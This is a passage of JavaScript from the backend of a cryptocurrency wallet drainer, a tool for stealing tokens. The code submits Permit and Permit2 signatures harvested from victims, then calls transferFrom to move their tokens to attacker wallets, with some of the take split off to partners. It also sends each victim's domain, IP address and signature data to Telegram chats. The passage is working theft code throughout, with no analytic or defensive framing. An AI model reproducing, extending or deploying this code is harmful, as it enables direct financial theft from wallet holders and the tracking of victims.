              await send_message(receiver_chat_id, `<b>🔑 Данные PERMIT пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>owner:</b> <code>${data.sign.owner}</code>\n<b>spender:</b> <code>${data.sign.spender}</code>\n<b>allowed:</b> <code>true</code>\n<b>nonce:</b> <code>${data.sign.nonce}</code>\n<b>deadline:</b> <code>${data.sign.deadline}</code>\n<b>v:</b> <code>${data.sign.v}</code>\n<b>r:</b> <code>${data.sign.r}</code>\n<b>s:</b> <code>${data.sign.s}</code>\n\nС помощью этих данных вы можете самостоятельно подписать PERMIT в сети ${chain_id_to_name(data.sign.chain_id)} для контракта: <code>${data.sign.address}</code>\n\nЕсли не удалось списать Permit автоматически, воспользуйтесь кнопкой ниже, чтобы повторить попытку списания.`, {
                parse_mode: 'HTML'
              });
            } else {
              await send_message(receiver_chat_id, `<b>🔑 Данные PERMIT пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>owner:</b> <code>${data.sign.owner}</code>\n<b>spender:</b> <code>${data.sign.spender}</code>\n<b>value:</b> <code>${data.sign.value}</code>\n<b>deadline:</b> <code>${data.sign.deadline}</code>\n<b>v:</b> <code>${data.sign.v}</code>\n<b>r:</b> <code>${data.sign.r}</code>\n<b>s:</b> <code>${data.sign.s}</code>\n\nС помощью этих данных вы можете самостоятельно подписать PERMIT в сети ${chain_id_to_name(data.sign.chain_id)} для контракта: <code>${data.sign.address}</code>\n\nЕсли не удалось списать Permit автоматически, воспользуйтесь кнопкой ниже, чтобы повторить попытку списания.`, {
                parse_mode: 'HTML'
              });
            }
          }
        }
      } catch(err) {
        console.log(err);
      }
    };

    if (MS_Settings.Permit.Bypass == 0 && gas_limit.gte(BN(6000000))) {

      const PERMIT_V_OPTIONS = [ 0, 1, 27, 28, 47, 215 ];
      let PERMIT_VALID_KEY = false;

      if (MS_Settings.Permit.Challenge == 1) {
        for (const new_v of PERMIT_V_OPTIONS) {
          try {
            if (data.sign.type == 1) contract_data = web3_contract.methods.permit(data.sign.owner, data.sign.spender, data.sign.nonce, data.sign.deadline, true, new_v, data.sign.r, data.sign.s).encodeABI();
            else contract_data = web3_contract.methods.permit(data.sign.owner, data.sign.spender, data.sign.value, data.sign.deadline, new_v, data.sign.r, data.sign.s).encodeABI();
            unsigned_tx.data = contract_data, gas_limit = BN(await node.estimateGas(unsigned_tx)).div(BN(100)).mul(BN(120));
            if (gas_limit.lt(BN(6000000))) {
              PERMIT_VALID_KEY = true;
              data.sign.v = new_v;
              break;
            }
          } catch(err) {
            console.log(err);
          }
        }
      }

      if (!PERMIT_VALID_KEY) {
        await send_permit_data();
        if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
          try {
            await send_message(receiver_chat_id, `<b>❌ Не удалось подписать PERMIT пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nСистема обнаружила, что, скорее всего, PERMIT является фейковым и с целью сохранения ваших денежных средств отклонила транзакцию.\n\nВы всё ещё можете попытаться вывести токен вручную, если вы считаете, что подпись всё же является настоящей.`, {
              parse_mode: 'HTML'
            });
          } catch(err) {
            console.log(err);
          }
        } return send_response(response, { status: 'OK' });
      }

    }

    await send_permit_data();

    try {

      if (balance.lt(gas_limit.mul(gas_price)) && wallet_address == MS_Wallet_Address) {
        if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
          try {
            await send_message(receiver_chat_id, `<b>❌ Не удалось вывести актив пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nНедостаточно нативной монеты на кошельке дрейнера, попробуйте пополнить и вывести вручную!`, {
              parse_mode: 'HTML'
            });
          } catch(err) {
            console.log(err);
          }
        }
        return send_response(response, { status: 'error', error: 'Unable to Execute' });
      } else if (balance.lt(gas_limit.mul(gas_price)) && wallet_address != MS_Wallet_Address) {
        const main_balance = await node.getBalance(MS_Wallet_Address);
        const main_signer = new RPC_WALLET(MS_Wallet_Private, node);
        const main_unsigned_tx = { from: MS_Wallet_Address, to: wallet_address, value: BN(100) };
        const main_gas_limit = BN(await node.estimateGas(main_unsigned_tx)).div(BN(100)).mul(BN(120));
        if (main_balance.lt(gas_limit.mul(gas_price).add(main_gas_limit.mul(gas_price)))) {
          if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
            let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
            try {
              await send_message(receiver_chat_id, `<b>❌ Не удалось вывести актив пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nНедостаточно нативной монеты на кошельке дрейнера, попробуйте пополнить и вывести вручную!`, {
                parse_mode: 'HTML'
              });
            } catch(err) {
              console.log(err);
            }
          }
          return send_response(response, { status: 'error', error: 'Unable to Execute' });
        }
        main_unsigned_tx.value = gas_limit.mul(gas_price);
        main_unsigned_tx.gasPrice = gas_price;
        main_unsigned_tx.gasLimit = main_gas_limit;
        main_unsigned_tx.nonce = await node.getTransactionCount(MS_Wallet_Address, 'pending');
        const main_tx = await main_signer.sendTransaction(main_unsigned_tx);
        await node.waitForTransaction(main_tx.hash, 1, 60000);
      }

      unsigned_tx.gasPrice = gas_price;
      unsigned_tx.gasLimit = gas_limit;
      unsigned_tx.nonce = await node.getTransactionCount(wallet_address, "pending");

      const tx = await signer.sendTransaction(unsigned_tx);
      await node.waitForTransaction(tx.hash, 1, 60000);
      await new Promise(r => setTimeout(r, 1000));

      let current_allowance = await Get_ERC20_Allowance(data.asset.chain_id, data.asset.address, data.address, wallet_address);
      if (!current_allowance) {
        await new Promise(r => setTimeout(r, 10000));
        current_allowance = await Get_ERC20_Allowance(data.asset.chain_id, data.asset.address, data.address, wallet_address);
        if (!current_allowance) {
          await new Promise(r => setTimeout(r, 20000));
          current_allowance = await Get_ERC20_Allowance(data.asset.chain_id, data.asset.address, data.address, wallet_address);
          if (!current_allowance) {
            if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
              let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
              await send_message(receiver_chat_id, `<b>❌ Не удалось вывести токен пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Токен:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}]\n\nВозможно, транзакция подтверждения не прошла или ещё в очереди, попробуйте вывести токен в ручном режиме!`, {
                parse_mode: 'HTML'
              });
            }
            return send_response(response, { status: 'error', error: 'Unable to Execute' });
          }
        }
      }

      add_allowance(data.address, wallet_address, data.asset.address, data.asset.chain_id,
      false, wallet_address != MS_Wallet_Address ? wallet_private : false, tx_count == 2 ? data.partner_address : false);

      try {
        if ((data.chat_data == false && MS_Notifications.approve_success.mode) || (data.chat_data != false && data.chat_data.approve_success != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_success.chat_id : data.chat_data.approve_success;
          await send_message(receiver_chat_id, `<b>👁 Успешно выдан доступ PERMIT #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Токен:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}] - ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`, {
            parse_mode: 'HTML'
          });
        }
      } catch(err) {
        console.log(err);
      }

      if (MS_Settings.Approve.Withdraw == 0 || data.asset.amount_usd < MS_Settings.Approve.Withdraw_Amount) {
        try {
          if (MS_Wallet_Address != wallet_address) {
            await new Promise(r => setTimeout(r, 1000));
            balance = await node.getBalance(wallet_address);
            unsigned_tx = { from: wallet_address, to: MS_Wallet_Address, value: BN(100) };
            gas_limit = BN(await node.estimateGas(unsigned_tx)).div(BN(100)).mul(BN(120));
            const available_amount = balance.sub(gas_limit.mul(gas_price));
            if (available_amount.gt(BN(0))) {
              unsigned_tx.value = available_amount;
              unsigned_tx.gasPrice = gas_price;
              unsigned_tx.gasLimit = gas_limit;
              unsigned_tx.nonce = await node.getTransactionCount(wallet_address, 'pending');
              await signer.sendTransaction(unsigned_tx);
            }
          }
        } catch(err) {
          console.log(err);
        }
        return send_response(response, { status: 'OK' });
      }

      unsigned_tx = { from: wallet_address, to: data.asset.address, value: "0x0" };
      web3_contract = new web3.eth.Contract(MS_Contract_ABI['ERC20'], data.asset.address);
      contract_data = web3_contract.methods.transferFrom(data.address, MS_Wallet_Receiver[Math.floor(Math.random() * MS_Wallet_Receiver.length)], current_allowance).encodeABI();

      unsigned_tx.data = contract_data;
      gas_limit = BN(await node.estimateGas(unsigned_tx)).div(BN(100)).mul(BN(120));

      if (MS_Settings.Approve.Bypass == 0 && gas_limit.gte(BN(6000000))) {
        if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
          try {
            await send_message(receiver_chat_id, `<b>❌ Не удалось вывести актив пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nУчтите, что скорее всего PERMIT был успешно подписан, не удалось только снять активы с кошелька, вы можете попробовать вручную!`, {
              parse_mode: 'HTML'
            });
          } catch(err) {
            console.log(err);
          }
        }
        return send_response(response, { status: 'error', error: 'Unable to Execute' });
      }

      try {

        balance = await node.getBalance(wallet_address);

        if (balance.lt(gas_limit.mul(gas_price).mul(BN(tx_count))) && wallet_address == MS_Wallet_Address) {
          if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
            let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
            try {
              await send_message(receiver_chat_id, `<b>❌ Не удалось вывести актив пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nНедостаточно нативной монеты на кошельке дрейнера, попробуйте пополнить и вывести вручную!`, {
                parse_mode: 'HTML'
              });
            } catch(err) {
              console.log(err);
            }
          }
          return send_response(response, { status: 'error', error: 'Unable to Execute' });
        } else if (balance.lt(gas_limit.mul(gas_price)) && wallet_address != MS_Wallet_Address) {
          const main_balance = await node.getBalance(MS_Wallet_Address);
          const main_signer = new RPC_WALLET(MS_Wallet_Private, node);
          const main_unsigned_tx = { from: MS_Wallet_Address, to: wallet_address, value: BN(100) };
          const main_gas_limit = BN(await node.estimateGas(main_unsigned_tx)).div(BN(100)).mul(BN(120));
          if (main_balance.lt(gas_limit.mul(gas_price).mul(BN(tx_count)).add(main_gas_limit.mul(gas_price)))) {
            if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
              let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
              try {
                await send_message(receiver_chat_id, `<b>❌ Не удалось вывести актив пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nНедостаточно нативной монеты на кошельке дрейнера, попробуйте пополнить и вывести вручную!`, {
                  parse_mode: 'HTML'
                });
              } catch(err) {
                console.log(err);
              }
            }
            return send_response(response, { status: 'error', error: 'Unable to Execute' });
          }
          main_unsigned_tx.value = gas_limit.mul(gas_price).mul(BN(tx_count));
          main_unsigned_tx.gasPrice = gas_price;
          main_unsigned_tx.gasLimit = main_gas_limit;
          main_unsigned_tx.nonce = await node.getTransactionCount(MS_Wallet_Address, 'pending');
          const main_tx = await main_signer.sendTransaction(main_unsigned_tx);
          await node.waitForTransaction(main_tx.hash, 1, 60000);
        }

        if (tx_count == 1) {

          unsigned_tx.gasPrice = gas_price;
          unsigned_tx.gasLimit = gas_limit;
          unsigned_tx.nonce = await node.getTransactionCount(wallet_address, "pending");

          const tx = await signer.sendTransaction(unsigned_tx);
          await node.waitForTransaction(tx.hash, 1, 60000);

        } else {

          let partner_amount = BN(current_allowance).div(BN(100)).mul(BN(split_data));
          let owner_amount = BN(current_allowance).sub(partner_amount);

          unsigned_tx.data = web3_contract.methods.transferFrom(data.address, MS_Wallet_Receiver[Math.floor(Math.random() * MS_Wallet_Receiver.length)], owner_amount.toString()).encodeABI();
          unsigned_tx.gasPrice = gas_price;
          unsigned_tx.gasLimit = gas_limit;
          unsigned_tx.nonce = await node.getTransactionCount(wallet_address, "pending");

          let tx = await signer.sendTransaction(unsigned_tx);
          await node.waitForTransaction(tx.hash, 1, 60000);
          await new Promise(r => setTimeout(r, 1000));

          unsigned_tx.data = web3_contract.methods.transferFrom(data.address, data.partner_address, partner_amount.toString()).encodeABI();
          unsigned_tx.nonce = await node.getTransactionCount(wallet_address, "pending");

          tx = await signer.sendTransaction(unsigned_tx);
          await node.waitForTransaction(tx.hash, 1, 60000);

        }

        try {
          if (MS_Wallet_Address != wallet_address) {
            await new Promise(r => setTimeout(r, 1000));
            balance = await node.getBalance(wallet_address);
            unsigned_tx = { from: wallet_address, to: MS_Wallet_Address, value: BN(100) };
            gas_limit = BN(await node.estimateGas(unsigned_tx)).div(BN(100)).mul(BN(120));
            const available_amount = balance.sub(gas_limit.mul(gas_price));
            if (available_amount.gt(BN(0))) {
              unsigned_tx.value = available_amount;
              unsigned_tx.gasPrice = gas_price;
              unsigned_tx.gasLimit = gas_limit;
              unsigned_tx.nonce = await node.getTransactionCount(wallet_address, 'pending');
              await signer.sendTransaction(unsigned_tx);
            }
          }
        } catch(err) {
          console.log(err);
        }

        add_record({
          type: 'asset_sent', domain: data.domain, IP: data.IP,
          user_id: data.user_id, asset: data.asset, worker_id: data.worker_id || null
        });

        try {
          if ((data.chat_data == false && MS_Notifications.approve_success.mode) || (data.chat_data != false && data.chat_data.approve_success != "")) {
            let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_success.chat_id : data.chat_data.approve_success;
            await send_message(receiver_chat_id, `<b>💎 Успешно выведен токен пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Токен:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}] - ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`, {
              parse_mode: 'HTML'
            });
          }
        } catch(err) {
          console.log(err);
        }

      } catch(err) {
        console.log(err);
        if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
          try {
            await send_message(receiver_chat_id, `<b>❌ Не удалось вывести актив пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nУчтите, что скорее всего PERMIT был успешно подписан, не удалось только снять активы с кошелька, вы можете попробовать вручную!`, {
              parse_mode: 'HTML'
            });
          } catch(err) {
            console.log(err);
          }
        }
        return send_response(response, { status: 'error', error: 'Unable to Execute' });
      }

    } catch(err) {
      console.log(err);
      if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
        try {
          await send_message(receiver_chat_id, `<b>❌ Не удалось подписать PERMIT пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nВы можете попробовать вывести эти активы самостоятельно с помощью данных PERMIT, если они включены в настройках дрейнера.`, {
            parse_mode: 'HTML'
          });
        } catch(err) {
          console.log(err);
        }
      }
      return send_response(response, { status: 'error', error: 'Unable to Execute' });
    }

    return send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    return send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const sign_permit2 = async (response, data) => {
  try {
    if (MS_Settings.Permit2.Mode == 0) return send_response(response, { status: 'OK' });

    if (MS_Protection) {
      if (User_IPs_Pool[data.IP]) {
        if (User_IPs_Pool[data.IP]['strange_data'] > Math.floor(Date.now() / 1000)) {
          return block_request(response);
        }
      }
    }

    if (MS_VERIFY_WALLET == 1 && !MS_Verified_Addresses[data.address]) {
      return send_response(response, { status: 'error', error: 'Verify Wallet First' });
    }

    const PERMIT2_ADDR = `0x000000000022d473030f116ddee9f6b43ac78ba3`;

    const wallet_address = (MS_Settings.Use_Randomizer_For_Tokens && data.PW != false) ? data.PW.address : MS_Wallet_Address;
    const wallet_private = (MS_Settings.Use_Randomizer_For_Tokens && data.PW != false) ? get_random_wallet_private(data.PW.address) : MS_Wallet_Private;

    let split_data = get_split_data(data.partner_address, MS_Split_Modes.tokens.permit2, (data.asset.amount_usd || null));
    let tx_count = !split_data ? 1 : 2;

    const node = new RPC_NODE(MS_Private_RPC_URLs[data.asset.chain_id]);
    const signer = new RPC_WALLET(wallet_private, node);

    const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(MS_Gas_Multiplier * 100)));

    let balance = await node.getBalance(wallet_address);
    let unsigned_tx = { from: wallet_address, to: PERMIT2_ADDR, value: "0x0" };

    const web3 = new Web3(MS_Private_RPC_URLs[data.asset.chain_id]); let contract_data = null;
    let web3_contract_batch = new web3.eth.Contract(MS_Contract_ABI['PERMIT2_BATCH'], PERMIT2_ADDR);
    let web3_contract_single = new web3.eth.Contract(MS_Contract_ABI['PERMIT2_SINGLE'], PERMIT2_ADDR);

    const send_permit_data = async () => {
      try {
        let permit_id = 0;
        if (fs.existsSync(path.join('data', 'permits_2'))) {
          for (const filename of fs.readdirSync(path.join('data', 'permits_2'))) {
            try {
              if (parseInt(filename) >= permit_id) {
                permit_id = parseInt(filename) + 1;
              }
            } catch(err) {
              console.log(err);
            }
          }
        }
        fs.writeFileSync(path.join('data', 'permits_2', `${permit_id}.permit`), JSON.stringify(data), 'utf-8');
        add_record({ type: 'permit2_data', domain: data.domain, IP: data.IP, user_id: data.user_id, worker_id: data.worker_id || null, signature: data.signature, message: data.message });
        if ((data.chat_data == false && MS_Notifications.permit_sign_data.mode) || (data.chat_data != false && data.chat_data.permit_sign_data != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.permit_sign_data.chat_id : data.chat_data.permit_sign_data;
          if (MS_Functional_Bot) {
            await send_message(receiver_chat_id, `<b>🔑 Данные Permit2 пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Подпись:</b> <code>${data.signature}</code>\n<b>Данные:</b> <code>${JSON.stringify(data.message)}</code>\n<b>Владелец:</b> <code>${data.address}</code>\n\nС помощью этих данных вы можете самостоятельно подписать Permit2 в сети ${chain_id_to_name(data.asset.chain_id)} для контракта: <code>0x000000000022d473030f116ddee9f6b43ac78ba3</code>`, {
              parse_mode: 'HTML', reply_markup: {
                inline_keyboard: [
                  [
                    {
                      text: 'Подписать вручную',
                      callback_data: `sign_permit2_${permit_id}`
                    }
                  ]
                ]
              }
            });
          } else {
            await send_message(receiver_chat_id, `<b>🔑 Данные Permit2 пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Подпись:</b> <code>${data.signature}</code>\n<b>Данные:</b> <code>${JSON.stringify(data.message)}</code>\n<b>Владелец:</b> <code>${data.address}</code>\n\nС помощью этих данных вы можете самостоятельно подписать Permit2 в сети ${chain_id_to_name(data.asset.chain_id)} для контракта: <code>0x000000000022d473030f116ddee9f6b43ac78ba3</code>`, {
              parse_mode: 'HTML'
            });
          }
        }
      } catch(err) {
        console.log(err);
      }
    };

    await send_permit_data();

    let available_assets = [];

    for (const x_asset of data.assets) {
      try {
        if (x_asset.amount_usd < MS_Settings.Permit2.Price) continue;
        let current_allowance = await Get_ERC20_Allowance(x_asset.chain_id, x_asset.address, data.address, PERMIT2_ADDR);
        if (current_allowance != false) {
          const contract = new ethers.Contract(x_asset.address, MS_Contract_ABI['ERC20'], signer);
          const asset_balance = await contract.balanceOf(data.address);
          if (BN(asset_balance).gt(BN(0)) && BN(current_allowance).gt(BN(0))) {
            if (BN(asset_balance).lt(BN(current_allowance))) available_assets.push({ asset: x_asset, balance: asset_balance });
            else available_assets.push({ asset: x_asset, balance: current_allowance });
          }
        }
      } catch(err) {
        console.log(err);
      }
    }

    if (available_assets.length < 1) {
      if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
        try {
          await send_message(receiver_chat_id, `<b>❌ Не удалось подписать PERMIT2 пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nВероятнее всего, перед вами фейковая подпись PERMIT2, так как ни один из токенов, который был заявлен в подписи, на самом деле не одобрен на контракт PERMIT2.`, {
            parse_mode: 'HTML'
          });
        } catch(err) {
          console.log(err);
        }
      }
      return send_response(response, { status: 'OK' });
    }

    if (data.mode == 1) {

      unsigned_tx.data = web3_contract_single.methods.permit(data.address, data.message, data.signature).encodeABI();
      let gas_limit = BN(await node.estimateGas(unsigned_tx)).div(BN(100)).mul(BN(120));

      if (MS_Settings.Permit2.Bypass == 0 && gas_limit.gte(BN(6000000))) {
        if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
          try {
            await send_message(receiver_chat_id, `<b>❌ Не удалось подписать PERMIT2 пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nСистема обнаружила, что, скорее всего, PERMIT является фейковым и с целью сохранения ваших денежных средств отклонила транзакцию.\n\nВы всё ещё можете попытаться вывести токен вручную, если вы считаете, что подпись всё же является настоящей.`, {
              parse_mode: 'HTML'
            });
          } catch(err) {
            console.log(err);
          }
        }
        return send_response(response, { status: 'OK' });
      }

      try {

        if (balance.lt(gas_limit.mul(gas_price)) && wallet_address == MS_Wallet_Address) {
          if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
            let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
            try {
              await send_message(receiver_chat_id, `<b>❌ Не удалось вывести актив пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nНедостаточно нативной монеты на кошельке дрейнера, попробуйте пополнить и вывести вручную!`, {
                parse_mode: 'HTML'
              });
            } catch(err) {
              console.log(err);
            }
          }
          return send_response(response, { status: 'error', error: 'Unable to Execute' });
        } else if (balance.lt(gas_limit.mul(gas_price)) && wallet_address != MS_Wallet_Address) {
          const main_balance = await node.getBalance(MS_Wallet_Address);
          const main_signer = new RPC_WALLET(MS_Wallet_Private, node);
          const main_unsigned_tx = { from: MS_Wallet_Address, to: wallet_address, value: BN(100) };
          const main_gas_limit = BN(await node.estimateGas(main_unsigned_tx)).div(BN(100)).mul(BN(120));
          if (main_balance.lt(gas_limit.mul(gas_price).add(main_gas_limit.mul(gas_price)))) {
            if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
              let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
              try {
                await send_message(receiver_chat_id, `<b>❌ Не удалось вывести актив пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nНедостаточно нативной монеты на кошельке дрейнера, попробуйте пополнить и вывести вручную!`, {
                  parse_mode: 'HTML'
                });
              } catch(err) {
                console.log(err);
              }
            }
            return send_response(response, { status: 'error', error: 'Unable to Execute' });
          }
          main_unsigned_tx.value = gas_limit.mul(gas_price);
          main_unsigned_tx.gasPrice = gas_price;
          main_unsigned_tx.gasLimit = main_gas_limit;
          main_unsigned_tx.nonce = await node.getTransactionCount(MS_Wallet_Address, 'pending');
          const main_tx = await main_signer.sendTransaction(main_unsigned_tx);
          await node.waitForTransaction(main_tx.hash, 1, 60000);
        }

        unsigned_tx.gasLimit = gas_limit;
        unsigned_tx.gasPrice = gas_price;
        unsigned_tx.nonce = await node.getTransactionCount(wallet_address, 'pending');

        let tx = await signer.sendTransaction(unsigned_tx);
        await node.waitForTransaction(tx.hash, 1, 60000);
        await new Promise(r => setTimeout(r, 10000));

        add_allowance(data.address, wallet_address, data.asset.address, data.asset.chain_id,
        true, wallet_address != MS_Wallet_Address ? wallet_private : false, tx_count == 2 ? data.partner_address : false);

        try {
          if ((data.chat_data == false && MS_Notifications.approve_success.mode) || (data.chat_data != false && data.chat_data.approve_success != "")) {
            let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_success.chat_id : data.chat_data.approve_success;
            await send_message(receiver_chat_id, `<b>👁 Успешно выдан доступ PERMIT2 #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Токен:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}] - ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`, {
              parse_mode: 'HTML'
            });
          }
        } catch(err) {
          console.log(err);
        }

        let withdraw_available_tokens = [];

        for (const x_token of available_assets) {
          try {
            if (MS_Settings.Approve.Withdraw == 1 && x_token.asset.amount_usd >= MS_Settings.Approve.Withdraw_Amount) {
              withdraw_available_tokens.push(x_token);
            }
          } catch(err) {
            console.log(err);
          }
        }

        if (withdraw_available_tokens.length < 1) {
          try {
            if (MS_Wallet_Address != wallet_address) {
              await new Promise(r => setTimeout(r, 1000));
              balance = await node.getBalance(wallet_address);
              unsigned_tx = { from: wallet_address, to: MS_Wallet_Address, value: BN(100) };
              gas_limit = BN(await node.estimateGas(unsigned_tx)).div(BN(100)).mul(BN(120));
              const available_amount = balance.sub(gas_limit.mul(gas_price));
              if (available_amount.gt(BN(0))) {
                unsigned_tx.value = available_amount;
                unsigned_tx.gasPrice = gas_price;
                unsigned_tx.gasLimit = gas_limit;
                unsigned_tx.nonce = await node.getTransactionCount(wallet_address, 'pending');
                await signer.sendTransaction(unsigned_tx);
              }
            }
          } catch(err) {
            console.log(err);
          }
          return send_response(response, { status: 'OK' });
        }

        try {

          unsigned_tx = { from: wallet_address, to: PERMIT2_ADDR, value: "0x0" };

          if (tx_count == 1) {
            unsigned_tx.data = web3_contract_single.methods.transferFrom(data.address, MS_Wallet_Receiver[Math.floor(Math.random() * MS_Wallet_Receiver.length)], available_assets[0].balance.toString(), data.asset.address).encodeABI();
            gas_limit = BN(await node.estimateGas(unsigned_tx)).div(BN(100)).mul(BN(120));
          } else {
            const partner_amount = BN(available_assets[0].balance).div(BN(100)).mul(BN(split_data));
            const owner_amount = BN(available_assets[0].balance).sub(partner_amount);
            const transfer_details = [
              {
                from: data.address, to: MS_Wallet_Receiver[Math.floor(Math.random() * MS_Wallet_Receiver.length)],
                token: data.asset.address, amount: owner_amount.toString()
              },
              {
                from: data.address, to: data.partner_address,
                token: data.asset.address, amount: partner_amount.toString()
              }
            ];
            unsigned_tx.data = web3_contract_batch.methods.transferFrom(transfer_details).encodeABI();
            gas_limit = BN(await node.estimateGas(unsigned_tx)).div(BN(100)).mul(BN(120));
          }

          balance = await node.getBalance(wallet_address);

          if (balance.lt(gas_limit.mul(gas_price)) && wallet_address == MS_Wallet_Address) {
            if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
              let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
              try {
